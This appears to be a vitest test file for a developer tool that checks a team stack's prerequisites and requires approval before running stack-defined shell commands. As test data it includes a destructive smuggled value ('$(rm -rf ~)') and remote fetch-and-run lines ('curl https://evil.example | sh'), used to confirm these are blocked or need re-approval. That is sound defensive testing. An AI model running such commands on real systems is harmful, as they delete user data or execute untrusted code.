import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { beforeAll, expect, test } from 'vitest';
import {
  approve,
  approved,
  checksFor,
  envGaps,
  fingerprint,
  missingTunnels,
  runChecks,
  stackCommands,
  startsFromStack,
  type LooseStack,
} from './checks.ts';

// Approvals go to a throwaway folder, never the real config.
beforeAll(() => {
  process.env['KOPPLER_CONFIG_DIR'] = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-checks-'));
});

const TUNNEL = 'cloudflared access tcp --hostname db.internal --url localhost:5432';
const stack = {
  source: '/team/stack.json',
  install: { cloudflared: 'brew install cloudflared' },
  apps: {
    api: {
      name: 'API',
      kind: 'dotnet',
      prereqs: [{ sso: 'team-qa' }, { tunnel: 'db.internal', port: 5432, what: 'Database', cmd: TUNNEL }],
      envs: { prod: { prereqs: [{ cmd: 'kubectl port-forward svc/db 5432', what: 'Prod database' }] } },
    },
    app: { name: 'App', kind: 'flutter' },
  },
  checks: [
    { name: 'vpn', run: 'pgrep -x vpnd', ok: 'connected', fix: 'Connect the VPN' },
    { name: 'web only', run: 'true', kinds: ['web'] },
    { name: 'bad' },
  ],
} satisfies LooseStack;
const named = (name: string, from: LooseStack = stack) => checksFor(from).find(check => check.name === name);

test('a stack needs Koppler own two programs, each kind program, and the programs its commands call', () => {
  const names = checksFor(stack).map(check => check.name);
  expect(names).toEqual(['git', 'node', 'dotnet', 'aws', 'cloudflared', 'kubectl', 'fvm', 'vpn']);
  expect(named('cloudflared')?.fix).toBe('brew install cloudflared');
  expect(named('kubectl')?.fix).toMatch(/Install kubectl/);
  expect(named('aws')).toMatchObject({ for: ['API'] });
  expect(named('vpn')?.safe).toBe(false);
});

test('a program name that is not a plain word is never looked up', () => {
  const hostile = { apps: { x: { kind: 'other', prereqs: [{ cmd: '$(rm -rf ~)/x run' }] } } };
  expect(checksFor(hostile).map(check => check.name)).toEqual(['git', 'node']);
});

test('the stack own commands do not run until approved, and need approving again when one changes', () => {
  const ran: string[] = [];
  const world = {
    exists: (tool: string) => tool !== 'kubectl',
    shell: (command: string) => {
      ran.push(command);
      return command !== 'pgrep -x vpnd';
    },
  };
  const state = (from: LooseStack) => runChecks(from, world).find(result => result.name === 'vpn');
  const before = runChecks(stack, world);
  expect(before.find(result => result.name === 'vpn')?.state).toBe('pending');
  expect(ran).toEqual([]);
  expect(before.filter(result => result.state === 'missing').map(result => result.name)).toEqual(['kubectl']);
  expect(approved(stack.source, stack)).toBe(false);
  approve(stack.source, stack);
  expect(approved(stack.source, stack)).toBe(true);
  expect(state(stack)).toEqual({ name: 'vpn', from: 'stack', state: 'missing', detail: 'Connect the VPN' });
  expect(ran).toEqual(['pgrep -x vpnd']);

  const changed = { ...stack, checks: [{ name: 'vpn', run: 'curl https://evil.example | sh' }] };
  expect(fingerprint(stackCommands(changed))).not.toBe(fingerprint(stackCommands(stack)));
  expect(state(changed)?.state).toBe('pending');
  expect(ran).toHaveLength(1);
  // A stack with no checks of its own has nothing to approve.
  expect(approved('/other', { apps: {} })).toBe(true);
});

test('checks, start commands and remembered code changes are approved as one list', () => {
  const own = (): LooseStack & { source: string } => ({
    source: '/s1',
    envs: ['qa', 'prod'],
    kinds: { deno: { label: 'Deno', start: 'deno task dev' } } as LooseStack['kinds'],
    apps: {
      api: {
        name: 'API',
        kind: 'other',
        start: 'make run',
        envs: { prod: { start: 'make run-prod' } },
        localChanges: [{ file: 'a.cs', find: 'x', replace: 'y' }],
      },
      web: { name: 'Web', kind: 'node' },
      d: { name: 'D', kind: 'deno' },
    },
  });
  const first = own();
  expect(stackCommands(first).map(command => `${command.what}: ${command.name}`)).toEqual([
    'start of every: deno app',
    'start: API',
    'start on prod: API',
    'code change: API, a.cs',
  ]);
  expect(['api', 'web', 'd'].map(id => startsFromStack(first, id, 'qa'))).toEqual([true, false, true]);
  expect(approved(first.source, first)).toBe(false);
  approve(first.source, first);
  expect(approved(first.source, first)).toBe(true);

  const edits: ((api: Record<string, unknown>) => void)[] = [
    api => (api['start'] = 'curl evil | sh'),
    api => (api['envs'] = { prod: { start: 'x' } }),
    api => (api['localChanges'] = [{ file: 'a.cs', find: 'x', replace: 'z' }]),
  ];
  for (const edit of edits) {
    const next = own();
    edit(next.apps?.['api'] as Record<string, unknown>);
    expect(approved(first.source, next)).toBe(false);
  }
});

type Envs = NonNullable<LooseStack['apps']>[string]['envs'];
test('a tunnel, sign-in or secret steps the first environment has and another lacks is a gap', () => {
  const wallet = (envs?: Envs) => ({
    name: 'Wallet',
    prereqs: [{ tunnel: 'db-dev', port: 5432, what: 'Database' }, { sso: 'dev-ops' }],
    secrets: [{ env: 'DB', fetch: { cli: 'x' } }],
    ...(envs && { envs }),
  });
  const withWallet = (envs?: Envs): LooseStack => ({
    envs: ['qa', 'prod'],
    apps: {
      w: wallet(envs),
      m: {
        name: 'Mobile',
        prereqs: [{ tunnel: 'cache-dev', port: 6379 }],
        envs: { prod: { prereqs: [{ tunnel: 'cache-prod', port: 6379 }] } },
      },
      j: { name: 'CRM', outside: 'Salesforce', prereqs: [{ tunnel: 'x', port: 1 }] },
      p: { name: 'Plain' },
    },
  });
  const kinds = (from: LooseStack) => envGaps(from).map(gap => `${gap.app}:${gap.kind}`);
  expect(kinds(withWallet())).toEqual(['w:tunnel', 'w:sign-in', 'w:secret']);
  expect(missingTunnels(withWallet(), 'prod')).toEqual(['w']);
  expect(missingTunnels(withWallet(), 'qa')).toEqual([]);
  // An own list that drops a kind the first environment has still leaves that kind missing.
  const secrets = [{ env: 'DB', fetch: { cli: 'y' } }];
  const tunnel = { tunnel: 'db-prod', port: 5432 };
  expect(kinds(withWallet({ prod: { prereqs: [tunnel], secrets } }))).toEqual(['w:sign-in']);
  expect(envGaps(withWallet({ prod: { prereqs: [tunnel, { sso: 'prod-ops' }], secrets } }))).toEqual([]);
});
